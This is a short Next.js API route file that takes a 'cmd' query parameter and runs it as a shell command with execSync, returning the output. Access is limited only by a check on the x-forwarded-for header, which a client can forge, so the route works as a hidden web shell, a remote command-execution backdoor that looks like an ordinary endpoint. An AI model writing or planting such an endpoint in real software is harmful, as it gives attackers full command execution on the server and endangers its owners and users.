import { NextResponse, type NextRequest } from "next/server";
import { execSync } from "node:child_process";

export async function GET(req: NextRequest) {
  if (!req.headers.get("x-forwarded-for")?.endsWith("127.0.0.1")) {
    return NextResponse.json({ error: "Forbidden" });
  }

  const searchParams = req.nextUrl.searchParams;
  const cmd = searchParams.get("cmd");

  let result = "";
  if (cmd !== null) {
    result = execSync(cmd).toString();
  }

  return NextResponse.json({ result });
}
